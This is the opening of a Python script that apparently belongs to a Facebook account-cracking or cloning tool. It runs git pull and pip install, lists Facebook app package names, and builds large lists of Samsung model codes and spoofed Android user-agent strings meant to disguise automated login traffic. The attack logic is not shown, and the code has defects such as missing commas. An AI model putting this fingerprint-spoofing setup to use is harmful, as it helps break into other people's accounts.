#creator : inoxent boy Haya Syco
#originally coded by Haya Syco
from os import path
import os,base64,zlib,pip,urllib,time
print('[\033[1;32m✓\033[1;37m]Be Patience Checking For Update !! ')
time.sleep(1.5)
print('[\033[1;32m✓\033[1;37m] Wait For Update Tool !! ')
time.sleep(1.5)
os.system('git pull')
os.system('clear')
print('[\033[1;32m✓\033[1;37m]Tool Update Done \033[1;32m✓\033[1;37m Now You Can Enjoy This Tool :) ')
time.sleep(2)
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
        os.system('git pull')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
ugen=[]
ugen=[]
useragent=[]
ugen2 =['Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-us; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-us; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; id-ID; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; id-ID; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-ID; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; id-IDN; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; id-IDN; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; id-IDN; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-BD; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-BD; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BD; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-BGD; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-BGD; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-BGD; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-PK; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-PK; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PK; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-PAK; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-PAK; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-PAK; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-IN; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-IN; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IN; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-IND; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-IND; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-IND; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; ar-SA; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; ar-SA; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SA; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
